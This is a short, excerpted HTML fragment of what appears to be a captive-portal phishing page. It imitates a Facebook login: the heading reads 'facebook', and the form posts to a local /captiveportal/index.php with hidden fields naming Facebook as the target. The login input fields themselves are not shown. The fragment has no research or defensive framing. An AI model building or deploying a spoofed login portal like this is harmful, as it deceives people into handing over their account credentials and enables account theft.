...
<html>
  ...
  <head>
    ...
    <link href='assets/fa_assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <link rel='stylesheet prefetch' href='assets/fa_assets/css/normalize.min.css'>
    <link rel="icon" type="image/png" href="assets/fa_assets/img/fm5arwc28y.png"/>
  ...
  <body>
    ...
    <section class="login-form-wrap">
      ...
      <h1 class="disable-selection">facebook</h1>
        ...
        <form class="login-form" method="POST" action="/captiveportal/index.php">
            ...
            <input type="hidden" name="target" value="https://facebook.com">
            <input type="hidden" name="domain" value="Facebook">
